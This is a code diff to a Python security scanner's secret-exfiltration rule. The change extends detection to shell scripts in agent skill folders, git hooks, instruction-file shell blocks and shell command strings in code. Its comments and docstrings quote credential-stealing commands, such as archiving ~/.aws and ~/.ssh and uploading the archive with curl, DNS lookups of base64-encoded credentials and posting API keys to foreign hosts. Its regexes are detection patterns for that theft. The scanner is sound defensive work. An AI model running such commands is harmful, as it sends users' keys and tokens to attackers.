@@ -21,6 +21,18 @@ network somewhere. This rule is the narrower, stronger case: a single construct 
   credential, the environment or a login token to a file or variable (``cat ~/.aws/credentials >>
   "$out"``), and a later line in which a network client uploads it (``curl --data-binary
   @"$out" ...``), the shape of the November 2026 CI and install-time stealers.
+* **A command the component gives an agent or a person to run**: a shell script in a skill's
+  folder or one an instruction file names (``Run `scripts/setup.sh` once``), a git hook file
+  (``pre-push`` in a folder ``core.hooksPath`` points at), a shell block of an instruction file
+  (``SKILL.md``, a command file), and the command string of ``os.system`` / ``subprocess`` with a
+  shell / ``child_process.exec``. Nothing runs these on its own, so each statement is judged by
+  itself and the destination has to be someone else's (``secret_upload(..., strict=True)``).
+* **A named provider token sent to a host that is not the provider**: ``curl -d
+  "k=$ANTHROPIC_API_KEY" https://collect...`` in a credential-helper script, ``$GITHUB_TOKEN`` in
+  a header to a host that is not GitHub. Only the names in ``_TOKEN_OWN_HOSTS`` and only a
+  written-out host: any other variable sent to the component's own API says nothing.
+* **Credentials archived first** (``tar czf F ~/.aws ~/.ssh``, then ``curl -F f=@F``), published
+  with ``gh gist create``, or sent as the labels of DNS lookups after encoding.
 * **Code that passes the whole process environment into a network request**: ``fetch(url, {body:
   JSON.stringify(process.env)})``, ``requests.post(url, json=dict(os.environ))``, directly or
   through a variable. The environment is where a machine keeps its tokens (CI secrets, cloud keys,
@@ -54,7 +66,10 @@ from skilltotal.scanners.install_scripts import (
     install_run_interpreters,
     npm_install_commands,
 )
+from skilltotal.scanners.python_ast import EFFECT_EXEC, _shell_command_text, python_call_effects
 from skilltotal.scanners.sensitive_paths import _STRONG_PATHS
+from skilltotal.scanners.shell_exec import _call_end, _string_literals, exec_call_pattern
+from skilltotal.scanners.skill_fetch_exec import _INSTRUCTION_FILE
 
 RULE_ID = "ST-SECRET-EXFIL"
 # The note for a JavaScript file the environment-send check stopped short in (models.UNANALYZED).
@@ -108,11 +123,45 @@ _HANDED_TO_CLIENT = re.compile(
     r"\b(?:AWS_SHARED_CREDENTIALS_FILE|AWS_CONFIG_FILE|GOOGLE_APPLICATION_CREDENTIALS|"
     r"SSH_KEY(?:_PATH)?|GIT_SSH_KEY)=|(?<![\w-])-v\s+|--volume[=\s]+|"
     r"--mount[=\s]+\S*?(?:source|src)=|--(?:cert|key|cacert|capath|netrc-file)[=\s]+|"
-    r"(?<![\w-])-E\s+|\b(?:mkdir|chmod|chown|test)\b[^|;&\n]*|\[\[?\s+-[efsr]\s+)"
+    r"(?<![\w-])-E\s+|\b(?:mkdir|chmod|chown|test)\b[^|;&\n]*|\[\[?\s+(?:!\s+)?-[A-Za-z]\s+|"
+    # The file a download or a command's output is written to: `curl -o ~/.kube/config URL`,
+    # `wget -O ~/.npmrc URL`, `... > ~/.aws/credentials`, `... | tee ~/.npmrc`.
+    r"(?<![\w-])-[A-Za-z]{0,6}[oO]\s+|--output(?:-document)?[=\s]+|(?<![0-9&<])>>?\s*|"
+    r"\btee\s+(?:-a\s+)?)"
     r"[\"']?[^\s\"'|;&]*$"
 )
 _STAGE_BREAK = re.compile(r"[;&|\n]|\$\(|`")
 _URL_HOST = re.compile(r"https?://([^/\s\"'`:?#]+)", re.IGNORECASE)
+# A machine's stored logins that the sensitive-path list leaves out (libraries read `~/.netrc`
+# on their own all the time), but that a command uploading it sends all the same.
+_NETRC = re.compile(r"~/\.netrc\b|(?<![\w.-])_netrc\b", re.IGNORECASE)
+# `scp host:backup/id_rsa ~/.ssh/id_rsa`: the last word of a copy from a remote is where the file
+# is written, not what is sent.
+_COPIED_FROM_REMOTE = re.compile(
+    r"\b(?:scp|rsync|sftp)\b[^|;&\n]{0,300}?\s[\w.@-]+:[^\s|;&]*\s+(?:[\"']?[^\s\"'|;&]+[\"']?\s+)*"
+    r"[\"']?[^\s\"'|;&]*$"
+)
+_STAGE_END = re.compile(r"[^\s\"'|;&]*[\"']?\s*(?=$|[|;&\n)])")
+# A file that holds a login token, read into a request's own auth header or user option: the
+# token is being used with a service (`curl -H "X-Vault-Token: $(cat ~/.vault-token)" ...`). A
+# private key or a cloud credentials file has no such use.
+_TOKEN_FILE = re.compile(
+    r"\.vault-token|huggingface/token|\.config/gh/hosts\.yml|\.config/gcloud|\.netrc"
+    r"|\.claude/\.credentials\.json|\.codex/auth\.json|\.gemini/oauth_creds\.json"
+    r"|github-copilot/|\.azure",
+    re.IGNORECASE,
+)
+_IN_AUTH_OPTION = re.compile(
+    r"(?:(?<![\w-])-H|--header|(?<![\w-])-u|--user|--oauth2-bearer|-Headers)(?:\s+|=)"
+    r"[\"']?[^\"'\n]{0,300}$"
+)
+# The host of each address, with `user:password@` left out.
+_ADDRESS_HOST = re.compile(r"https?://(?:[^\s/?#@'\"`]*@)?([^\s/?#:'\"`]+)", re.IGNORECASE)
+
+
+def _loopback(host: str) -> bool:
+    # A host name is compared here; nothing binds to it (the reason for the nosec below).
+    return host in ("localhost", "0.0.0.0", "[", "[::1]") or host.startswith("127.")  # nosec B104
 # The instance-metadata address reads credentials only when asked for them; how that is sent on
 # is a different question, left to the sensitive-path rule and the combination.
 _METADATA = re.compile(r"169\.254\.169\.254")
@@ -134,25 +183,87 @@ def _hosts(text: str) -> list[str]:
     return [m.group(1).lower() for m in _URL_HOST.finditer(text)]
 
 
-def secret_upload(command: str, env: str = "") -> tuple[int, int] | None:
-    """The span (in ``command``) of a credential, a token command or an environment dump that
-    the same command sends with a network client, or None.
+# Two more ways a command sends a credential without an HTTP client. `gh gist create <file>`
+# publishes the file. A DNS lookup of a name built from encoded data (`nslookup
+# "$(cat ~/.aws/credentials | base64 | head -c 60).t.example.invalid"`) carries it to whoever
+# runs the name server; the encoder is what tells that from a script resolving the hosts its
+# SSH configuration lists.
+_PUBLISHES_FILE = re.compile(r"(?:^|[\s;&|(`'\"])gh\s+gist\s+create\b")
+_DNS_LOOKUP = re.compile(
+    r"(?:^|[\s;&|(`'\"])(?:nslookup|dig|host)\s[^\n|;&]{0,300}?(?:\$\(|`|\$\{?\w)"
+)
+_ENCODES = re.compile(r"\b(?:base64|base32|xxd|hexdump|od\s+-)")
+
+
+def _sends(text: str) -> bool:
+    """True if the command runs something that can carry data off the machine."""
+    return bool(
+        _NET_CLIENT.search(text) or _INLINE_NET.search(text) or _PUBLISHES_FILE.search(text)
+        or (_DNS_LOOKUP.search(text) and _ENCODES.search(text))
+    )
+
+
+def _may_send(text: str) -> bool:
+    """A whole file's quick test: something in it can carry data off the machine."""
+    return bool(
+        _NET_CLIENT.search(text) or _INLINE_NET.search(text) or _PUBLISHES_FILE.search(text)
+        or _DNS_LOOKUP.search(text)
+    )
+
+
+def _credential_paths(text: str) -> list[re.Match[str]]:
+    """The credential locations written in ``text``, in order (the instance-metadata address is
+    left to the sensitive-path rule)."""
+    found = [m for m in _STRONG_PATHS.finditer(text) if not _METADATA.match(m.group(0))]
+    if "netrc" in text:
+        found = sorted([*found, *_NETRC.finditer(text)], key=lambda m: m.start())
+    return found
+
+
+def _not_sent(text: str, m: re.Match[str], strict: bool) -> bool:
+    """True if the credential path ``m`` is not something the command sends: handed to its own
+    client, written to (a download's output, the target of a copy from a remote), or, with
+    ``strict``, a token file read into the request's own auth header."""
+    before = _stage_before(text, m.start())
+    if _HANDED_TO_CLIENT.search(before):
+        return True
+    if _COPIED_FROM_REMOTE.search(before) and _STAGE_END.match(text, m.end()):
+        return True
+    if not strict:
+        return False
+    word_end = _STAGE_END.match(text, m.start())
+    word = text[m.start():word_end.end()] if word_end else m.group(0)
+    return bool(
+        _TOKEN_FILE.search(word)
+        and _IN_AUTH_OPTION.search(text, max(0, m.start() - _STAGE_WINDOW), m.start())
+    )
+
+
+def secret_upload(command: str, env: str = "", *, strict: bool = False) -> tuple[int, int] | None:
+    """The span (in ``command``) of a credential, a token command, a named provider token or an
+    environment dump that the same command sends with a network client, or None.
 
     ``env`` holds the values the command is started with: a credential path handed over through
     one is read by the command as well, but only ``command`` can run a network client.
+
+    ``strict`` is for a command that nothing runs on its own (a statement of a shell script the
+    component ships, a command in an instruction file, a command string in code). There the
+    destination has to be shown to be someone else's: a request to this machine is not an upload,
+    a token file read into the request's own auth header is the token being used, and a token
+    command counts only with a written-out host that is not the provider's.
     """
     text = _HOME.sub("~", command)
-    if not (_NET_CLIENT.search(text) or _INLINE_NET.search(text)):
+    if not _sends(text):
         return None
-    for m in _STRONG_PATHS.finditer(text):
-        if _METADATA.match(m.group(0)):
-            continue
-        if _HANDED_TO_CLIENT.search(_stage_before(text, m.start())):
+    if strict:
+        hosts = [h.lower() for h in _ADDRESS_HOST.findall(text)]
+        if hosts and all(_loopback(h) for h in hosts):
+            return None
+    for m in _credential_paths(text):
+        if _not_sent(text, m, strict):
             continue
         return _original_span(command, text, m.start(), m.end())
-    if env and any(
-        not _METADATA.match(m.group(0)) for m in _STRONG_PATHS.finditer(_HOME.sub("~", env))
-    ):
+    if env and _credential_paths(_HOME.sub("~", env)):
         hit = _NET_CLIENT.search(text) or _INLINE_NET.search(text)
         return _original_span(command, text, hit.start(), hit.end()) if hit else None
     m = _ENV_DUMP.search(text)
@@ -165,7 +276,42 @@ def secret_upload(command: str, env: str = "") -> tuple[int, int] | None:
         hosts = _hosts(text)
         if own_hosts and hosts and all(h.endswith(own_hosts) for h in hosts):
             continue  # the provider's token sent to the provider: that is how it is used
+        if strict and (not hosts or any("$" in h for h in hosts)):
+            continue  # the destination is not written out: nothing shows it is someone else's
         return _original_span(command, text, m.start(), m.end())
+    span = _named_token_sent(text)
+    if span is not None:
+        return _original_span(command, text, *span)
+    return None
+
+
+def _named_token_sent(text: str) -> tuple[int, int] | None:
+    """The span of a named provider token (``$GITHUB_TOKEN``, ``$NPM_TOKEN``,
+    ``$ANTHROPIC_API_KEY``: the names in ``_TOKEN_OWN_HOSTS``) that a network client sends to a
+    written-out host that is not the token's own service.
+
+    Any other variable (``$PDFHELPER_TOKEN`` sent to the component's own API) says nothing about
+    whose it is and is not matched, nor is a request whose host is itself a variable. A model
+    provider's key in an auth header is how a gateway or a compatible endpoint is called, so for
+    those two keys only the key as data or in the address counts.
+    """
+    if "$" not in text or not _NET_CLIENT.search(text):
+        return None
+    hosts = [h.lower() for h in _ADDRESS_HOST.findall(text)]
+    if not hosts or any("$" in h or "{" in h for h in hosts):
+        return None
+    hosts = [h for h in hosts if not _loopback(h)]
+    if not hosts:
+        return None
+    for m in _TOKEN_VARIABLE.finditer(text):
+        name = m.group(1)
+        if any(_own_host(name, h) for h in hosts):
+            continue
+        if name in _GATEWAY_KEYS and _IN_AUTH_OPTION.search(
+            text, max(0, m.start() - _STAGE_WINDOW), m.start()
+        ):
+            continue
+        return m.start(), m.end()
     return None
 
 
@@ -885,13 +1031,17 @@ class SecretExfilScanner(Scanner):
             severity=Severity.HIGH,
             title="Credentials or the whole environment sent off the machine",
             description=(
-                "One command or call reads a credential and sends it over the network. Either a "
+                "One command or call reads a credential and sends it over the network. A "
                 "command an agent or editor runs on its own (a hook, an MCP server's launch "
-                "command, a status line or credential helper, a plugin monitor) or an npm "
-                "install-time script uploads a key or credential file, a login token or the "
-                "environment (`curl -d @~/.ssh/id_rsa`, `env | curl --data-binary @-`), directly "
-                "or through a shell script that collects it into a file or variable and sends "
-                "that on a later line, or code passes the whole process environment "
+                "command, a status line or credential helper, a plugin monitor), an npm "
+                "install-time script, a shell script a skill or an instruction file gives the "
+                "agent to run, a git hook file, a shell block of an instruction file, or a "
+                "command string handed to a shell from Python or JavaScript uploads a key or "
+                "credential file, a login token or the environment (`curl -d @~/.ssh/id_rsa`, "
+                "`env | curl --data-binary @-`), sends a named provider token "
+                "(`$GITHUB_TOKEN`, `$ANTHROPIC_API_KEY`) to a host that is not that provider, "
+                "or collects credentials into a file, an archive or a variable and sends that "
+                "on a later line; or code passes the whole process environment "
                 "(`process.env`, `os.environ`) into an HTTP request. The environment holds the "
                 "machine's tokens and keys, so either way they reach whoever runs the endpoint."
             ),
@@ -917,6 +1067,10 @@ class SecretExfilScanner(Scanner):
             if ev is not None:
                 evidence.append(ev)
         evidence.extend(_install_evidence(index, by_path))
+        seen = {(ev.file, ev.line_start) for ev in evidence}
+        evidence.extend(_shell_file_evidence(index, seen))
+        evidence.extend(_instruction_evidence(index))
+        evidence.extend(_code_command_evidence(index))
         partly: list[tuple[str, int | None]] = []
         for f in index.select(suffixes=_JS_SUFFIXES):
             sends, truncated = _js_env_sends(f)
@@ -1003,6 +1157,259 @@ def _shell_script_upload(script: IndexedFile) -> Evidence | None:
     return None
 
 
+# --- commands nothing runs on its own ---------------------------------------------------------
+# A shell script the component ships (the one an instruction file or a person runs: `Run
+# scripts/setup.sh once`), a git hook file, a shell block of an agent-instruction file, and the
+# command string a Python or JavaScript file hands to a shell. Each statement is judged on its
+# own, as ``secret_upload(..., strict=True)`` reads it, so a credential path and a network client
+# count together only when one command holds both (`[ -d ~/.aws ] || curl -o awscli.zip ...` is
+# two commands), and the collect-then-send follow runs over the statements in order.
+_GIT_HOOK_NAMES = frozenset({
+    "applypatch-msg", "pre-applypatch", "post-applypatch", "pre-commit", "pre-merge-commit",
+    "prepare-commit-msg", "commit-msg", "post-commit", "pre-rebase", "post-checkout",
+    "post-merge", "pre-push", "pre-receive", "post-receive", "post-update", "pre-auto-gc",
+    "post-rewrite", "push-to-checkout", "reference-transaction",
+})
+_SHELL_FENCES = frozenset({"", "bash", "sh", "shell", "zsh", "console", "terminal", "!"})
+_FENCE_INFO = re.compile(r" {0,3}(?:`{3,}|~{3,})[ \t]*([\w+!-]*)")
+# Prose right above a block that shows a command as something to refuse or to look for: a
+# security skill's example of an attack is not a step to run.
+_SHOWN_AS_EXAMPLE = re.compile(
+    r"\b(?:never|do\s+not|don'?t|must\s+not|should\s+not)\s+(?:run|execute|use|follow|obey|paste"
+    r"|allow|approve)\b|\b(?:malicious|attack(?:er|s)?|suspicious|red\s+flags?|exfiltrat\w+"
+    r"|look\s+for|refuse|block(?:ed|s)?)\b",
+    re.IGNORECASE,
+)
+_PROSE_ABOVE = 400
+
+
+def _shown_as_example(text: str, fence_start: int) -> bool:
+    """True if the two lines of prose above a code block present it as an attack to recognise
+    or a command to refuse."""
+    above = text[max(0, fence_start - _PROSE_ABOVE):fence_start]
+    lines = [x for x in above.split("\n") if x.strip()]
+    return bool(_SHOWN_AS_EXAMPLE.search("\n".join(lines[-2:])))
+
+
+def _statements(line: str) -> list[str]:
+    """The separate commands of one shell line, split on ``;``, ``&&`` and ``||`` outside quotes
+    and substitutions (a pipeline stays whole), with a trailing ``#`` comment dropped."""
+    out: list[str] = []
+    quote = ""
+    depth = 0
+    start = i = 0
+    n = len(line)
+    while i < n:
+        ch = line[i]
+        if quote == "'":
+            if ch == "'":
+                quote = ""
+        elif ch == "\\":
+            i += 2
+            continue
+        elif ch == "$" and line.startswith("$(", i):
+            depth += 1
+            i += 2
+            continue
+        elif ch == ")" and depth:
+            depth -= 1
+        elif quote:
+            if ch == quote:
+                quote = ""
+        elif ch in "'\"":
+            quote = ch
+        elif depth == 0:
+            if ch == "#" and (i == 0 or line[i - 1] in " \t"):
+                break
+            if ch == ";" or line.startswith(("&&", "||"), i):
+                out.append(line[start:i])
+                i += 1 if ch == ";" else 2
+                start = i
+                continue
+        i += 1
+    out.append(line[start:i])
+    return [s for s in out if s.strip()]
+
+
+def _command_lines(text: str, first_line: int = 1) -> list[tuple[int, int, str]]:
+    """``(first line, last line, command)`` for each shell statement of ``text``, with
+    backslash-newline continuations joined the way the shell joins them."""
+    out: list[tuple[int, int, str]] = []
+    parts: list[str] = []
+    began = first_line
+    for no, raw in enumerate(text.split("\n")[:_MAX_STAGED_LINES], start=first_line):
+        raw = raw.rstrip("\r")
+        if not parts:
+            began = no
+            if raw.lstrip().startswith("#"):
+                continue
+        if raw.endswith("\\") and not raw.endswith("\\\\"):
+            parts.append(raw[:-1])
+            continue
+        parts.append(raw)
+        out.extend((began, no, s) for s in _statements(" ".join(parts)))
+        parts = []
+    return out
+
+
+def _commands_upload(
+    f: IndexedFile, text: str, first_line: int = 1
+) -> Evidence | None:
+    """The first statement of the shell ``text`` (which starts at ``first_line`` of ``f``) that
+    uploads a credential, or the statements that collect one and send it later."""
+    commands = _command_lines(text, first_line)
+    for began, ended, command in commands:
+        if secret_upload(command, strict=True) is not None and not _only_prints(command):
+            return f.evidence_for_lines(began, ended)
+    staged = staged_upload_lines([c for _b, _e, c in commands], strict=True)
+    if staged is not None:
+        read_at, send_at = commands[staged[0] - 1][0], commands[staged[1] - 1][1]
+        first = read_at if send_at - read_at <= _STAGED_SPAN else commands[staged[1] - 1][0]
+        return f.evidence_for_lines(first, send_at)
+    return None
+
+
+_PRINTS = re.compile(r"\s*(?:echo|printf|Write-Host|Write-Output)\s")
+_QUOTED = re.compile(r"\"(?:[^\"\\]|\\.)*\"|'[^']*'")
+
+
+def _only_prints(command: str) -> bool:
+    """True if the statement only prints text for a person to read (``echo "Then run: cat
+    ~/.kube/config | curl ..."``): an output command whose text runs nothing and goes nowhere. A
+    substitution inside it runs, and output piped or redirected onward is on its way somewhere."""
+    if not _PRINTS.match(command) or "$(" in command or "`" in command:
+        return False
+    return not re.search(r"[|>]", _QUOTED.sub("", command))
+
+
+def _is_shell_file(f: IndexedFile) -> bool:
+    """A shell script by suffix or first line, or a suffix-less git hook file (git runs those
+    with a shell when they have no first line naming another interpreter)."""
+    if f.suffix in _SHELL_SUFFIXES:
+        return True
+    if f.suffix != "":
+        return False
+    if f.is_shell_like:
+        return True
+    name = f.relpath.rsplit("/", 1)[-1]
+    return name in _GIT_HOOK_NAMES and not f.text.startswith("#!")
+
+
+def _shell_file_evidence(index: FileIndex, seen: set[tuple[str, int]]) -> list[Evidence]:
+    """Shell scripts an agent is given to run, and git hook files, whose own commands upload a
+    credential. A script counts when it sits in a skill's folder (next to or below a SKILL.md),
+    when an agent-instruction file names it (``Run `scripts/setup.sh` once``, "run the backup.sh
+    script"), or when it has a git hook's name (git runs ``pre-push`` from whatever folder
+    ``core.hooksPath`` points at). Any other script of a package is run by nothing the component
+    ships and is left to the sensitive-path rule."""
+    candidates = [
+        f for f in index.files
+        if _is_shell_file(f) and _may_send(f.text)
+    ]
+    if not candidates:
+        return []
+    skill_folders = {
+        f.relpath.rpartition("/")[0] for f in index.files
+        if f.relpath.rsplit("/", 1)[-1].lower() == "skill.md"
+    }
+    instructions = [f.text for f in index.files if _INSTRUCTION_FILE.search(f.relpath)]
+    found: list[Evidence] = []
+    for f in candidates:
+        name = f.relpath.rsplit("/", 1)[-1]
+        if not (
+            (f.suffix == "" and name in _GIT_HOOK_NAMES)
+            or any(d == "" or f.relpath.startswith(d + "/") for d in skill_folders)
+            or _named_in(name, instructions)
+        ):
+            continue
+        ev = _commands_upload(f, f.text)
+        if ev is not None and (ev.file, ev.line_start) not in seen:
+            seen.add((ev.file, ev.line_start))
+            found.append(ev)
+            if len(found) >= MAX_EVIDENCE_SCANNED:
+                break
+    return found
+
+
+def _named_in(name: str, texts: list[str]) -> bool:
+    """True if one of ``texts`` names the file ``name`` as a whole word."""
+    if not texts:
+        return False
+    word = re.compile(rf"(?<![\w.-]){re.escape(name)}(?![\w-])")
+    return any(name in text and word.search(text) for text in texts)
+
+
+def _instruction_evidence(index: FileIndex) -> list[Evidence]:
+    """Shell blocks of agent-instruction files (SKILL.md, a command or subagent file, CLAUDE.md,
+    AGENTS.md) whose commands upload a credential. A block shown as an example of what to refuse
+    is not a step."""
+    found: list[Evidence] = []
+    for f in index.files:
+        if f.suffix not in (".md", ".mdx") or not _INSTRUCTION_FILE.search(f.relpath):
+            continue
+        if not _may_send(f.text):
+            continue
+        for start, end in f.markdown_code_spans():
+            info = _FENCE_INFO.match(f.text, start)
+            if info is None or info.group(1).lower() not in _SHELL_FENCES:
+                continue
+            if _shown_as_example(f.text, start):
+                continue
+            ev = _commands_upload(f, f.text[start:end], f.line_of_offset(start))
+            if ev is not None:
+                found.append(ev)
+                if len(found) >= MAX_EVIDENCE_SCANNED:
+                    return found
+    return found
+
+
+def _code_command_evidence(index: FileIndex) -> list[Evidence]:
+    """Command strings a Python or JavaScript file hands to a shell (``os.system``,
+    ``subprocess`` with ``shell=True`` or a ``sh -c`` list, ``child_process.exec``) that upload a
+    credential."""
+    found: list[Evidence] = []
+    for f in index.select(suffixes=(".py", ".pyw")):
+        if not _SHELL_NET.search(f.text):
+            continue
+        try:
+            tree = ast.parse(f.text)
+        except (SyntaxError, ValueError, RecursionError, MemoryError):
+            continue
+        for effect in python_call_effects(f, tree):
+            if EFFECT_EXEC not in effect.effects:
+                continue
+            command = _shell_command_text(effect.name, effect.call)
+            if command and _any_statement_uploads(command):
+                call = effect.call
+                found.append(f.evidence_for_lines(
+                    call.lineno, getattr(call, "end_lineno", None) or call.lineno
+                ))
+                if len(found) >= MAX_EVIDENCE_SCANNED:
+                    return found
+    for f in index.select(suffixes=_JS_SUFFIXES):
+        if not _SHELL_NET.search(f.text):
+            continue
+        text = f.interop_view()
+        for m in exec_call_pattern(f).finditer(text):
+            if f.in_c_comment(m.start()):
+                continue
+            end = _call_end(text, m.end())
+            # Each string is a command line of its own (`exec("cat ... | curl ...")`); the pieces
+            # of an argument list are not joined, so a lone "env" word is not read as a dump.
+            if any(_any_statement_uploads(s) for s in _string_literals(text, m.end(), end)):
+                found.append(f.evidence_for_span(m.start(), end))
+                if len(found) >= MAX_EVIDENCE_SCANNED:
+                    return found
+    return found
+
+
+def _any_statement_uploads(command: str) -> bool:
+    commands = [c for _b, _e, c in _command_lines(command)]
+    return any(secret_upload(c, strict=True) is not None for c in commands) or (
+        staged_upload_lines(commands, strict=True) is not None
+    )
+
+
 # --- a script that collects a credential first and sends it on a later line ------------------
 # The real install-time stealers (the wfx campaign, November 2026) never read and send in one
 # command: `cat ~/.aws/credentials >> "$out"`, then `curl --data-binary @"$out" http://...`.
@@ -1022,55 +1429,85 @@ _MAX_STAGED_LINES = 5000
 _STAGED_SPAN = 3
 
 
-def _name_patterns(name: str) -> list[re.Pattern[str]]:
-    """Ways a line can hand the marked file or variable ``name`` to a network client as data."""
+def _name_patterns(name: str, encoded: bool = False) -> list[re.Pattern[str]]:
+    """Ways a line can hand the marked file or variable ``name`` to a network client as data, or
+    publish it (``gh gist create``); for data that was encoded when collected, also a DNS lookup
+    of a name built from it."""
     if name.startswith("$"):
         bare = re.escape(name.strip("${}"))
         ref = rf"\$\{{?{bare}\}}?(?![\w])"
     else:
         ref = rf"{re.escape(name)}(?![\w./-])"
-    return [
+    patterns = [
         re.compile(rf"@[\"']?{ref}"),
         re.compile(rf"{_UPLOAD_OPTION}(?:\s+|=)[\"']?[^\s\"']*{ref}"),
         re.compile(rf"<\s*[\"']?{ref}"),
         re.compile(rf"\bcat\s+[\"']?{ref}[\"']?\s*\|"),
+        re.compile(rf"\bgh\s+gist\s+create\b[^\n|;&]{{0,200}}?{ref}"),
     ]
+    if encoded:
+        patterns.append(re.compile(rf"\b(?:nslookup|dig|host)\s[^\n|;&]{{0,200}}?{ref}"))
+    return patterns
 
 
-def staged_upload_lines(lines: list[str]) -> tuple[int, int] | None:
-    """``(read_line, send_line)``, 1-based, of a credential collected into a file or variable on
-    one line and uploaded by a network client on a later one, or None."""
-    marked: dict[str, tuple[int, tuple[str, ...]]] = {}
+# An archive of credential locations is a file that holds them: `tar czf /tmp/s.tgz ~/.aws ~/.ssh`,
+# `zip -r backup.zip . ~/.ssh`, then `curl -F f=@/tmp/s.tgz ...`. (`tar czf - ~/.ssh | curl ...`
+# is one command, read by ``secret_upload``.)
+_ARCHIVE_TO = re.compile(
+    r"\btar\s+(?:-[A-Za-z]+\s+){0,3}(?:-?[A-Za-z]*c[A-Za-z]*f|(?:--create|-c)\b[^\n|;&]{0,80}?"
+    r"(?:\s-f|\s--file))[=\s]\s*[\"']?(\$\{?\w+\}?|[\w./~-]+)"
+    r"|\b(?:zip|7za?\s+a)\b(?:\s+-[\w-]+){0,6}\s+[\"']?(\$\{?\w+\}?|[\w./~-]+)"
+)
+# `for f in ~/.ssh/id_*; do curl -F "k=@$f" ...`: the loop variable names each credential file.
+_FOR_IN = re.compile(r"\s*for\s+([A-Za-z_]\w*)\s+in\s")
+
+
+def staged_upload_lines(lines: list[str], *, strict: bool = False) -> tuple[int, int] | None:
+    """``(read_line, send_line)``, 1-based, of a credential collected into a file, an archive or
+    a variable on one line and uploaded by a network client on a later one, or None. ``strict``
+    as in :func:`secret_upload`."""
+    marked: dict[str, tuple[int, tuple[str, ...], bool]] = {}
     for no, raw in enumerate(lines[:_MAX_STAGED_LINES], start=1):
         if raw.lstrip().startswith("#"):
             continue
         line = _HOME.sub("~", raw)
-        if marked and (_NET_CLIENT.search(line) or _INLINE_NET.search(line)):
+        if marked and (
+            _NET_CLIENT.search(line) or _INLINE_NET.search(line)
+            or _PUBLISHES_FILE.search(line) or _DNS_LOOKUP.search(line)
+        ):
             hosts = _hosts(line)
-            for name, (read_at, own_hosts) in marked.items():
+            local = strict and bool(hosts) and all(_loopback(h) for h in hosts)
+            unnamed = strict and (not hosts or any("$" in h for h in hosts))
+            for name, (read_at, own_hosts, encoded) in marked.items():
                 if own_hosts and hosts and all(h.endswith(own_hosts) for h in hosts):
                     continue
-                if any(p.search(line) for p in _name_patterns(name)):
+                if local or (own_hosts and unnamed):
+                    continue
+                if any(p.search(line) for p in _name_patterns(name, encoded)):
                     return read_at, no
-        source = _credential_source(line)
+        source = _credential_source(line, strict)
         if source is None:
             continue
         at, own_hosts = source
         names = [m.group(2) for m in _REDIRECT_TO.finditer(line, at)]
+        names += [m.group(1) or m.group(2) for m in _ARCHIVE_TO.finditer(line, 0, at)]
         assign = _ASSIGN_FROM.match(line)
         if assign and assign.end() <= at:
             names.append("$" + assign.group(1))
+        loop = _FOR_IN.match(line)
+        if loop and loop.end() <= at:
+            names.append("$" + loop.group(1))
         for name in names:
-            if name.startswith("/dev/"):
+            if name.startswith("/dev/") or name == "-":
                 continue
-            marked.setdefault(name, (no, own_hosts))
+            marked.setdefault(name, (no, own_hosts, bool(_ENCODES.search(line))))
     return None
 
 
-def _credential_source(line: str) -> tuple[int, tuple[str, ...]] | None:
+def _credential_source(line: str, strict: bool = False) -> tuple[int, tuple[str, ...]] | None:
     """Offset of what the line reads that holds credentials, and the hosts it may go to, or None."""
-    for m in _STRONG_PATHS.finditer(line):
-        if _METADATA.match(m.group(0)) or _HANDED_TO_CLIENT.search(_stage_before(line, m.start())):
+    for m in _credential_paths(line):
+        if _not_sent(line, m, strict):
             continue
         return m.start(), ()
     m = _ENV_DUMP.search(line)
@@ -1107,6 +1544,26 @@ _TOKEN_OWN_HOSTS = {
     "OPENAI_API_KEY": ("openai.com",),
     "ANTHROPIC_API_KEY": ("anthropic.com",),
 }
+# The same tokens as a shell or PowerShell variable in a command.
+_TOKEN_VARIABLE = re.compile(
+    r"\$(?:[eE]nv:)?\{?(" + "|".join(_TOKEN_OWN_HOSTS) + r")\}?(?![\w])"
+)
+# A model provider's key is also what a gateway or a compatible endpoint is called with.
+_GATEWAY_KEYS = frozenset({"OPENAI_API_KEY", "ANTHROPIC_API_KEY"})
+# More places a token is honestly sent from a command: GitHub's container registry, and a GitLab
+# the project hosts itself (the usual way to run GitLab).
+_COMMAND_OWN_HOSTS = {"GITHUB_TOKEN": ("ghcr.io",), "GH_TOKEN": ("ghcr.io",)}
+_SELF_HOSTED = {"GITLAB_TOKEN": "gitlab", "CI_JOB_TOKEN": "gitlab"}
+
+
+def _own_host(token: str, host: str) -> bool:
+    """True if ``host`` belongs to the service that issued the token named ``token``."""
+    token = token.upper()
+    host = host.rsplit("@", 1)[-1].split(":", 1)[0]
+    own = _TOKEN_OWN_HOSTS.get(token, ()) + _COMMAND_OWN_HOSTS.get(token, ())
+    if any(host == o or host.endswith("." + o) for o in own):
+        return True
+    return token in _SELF_HOSTED and _SELF_HOSTED[token] in host
 
 
 def _js_token_in_url(f: IndexedFile) -> Evidence | None:
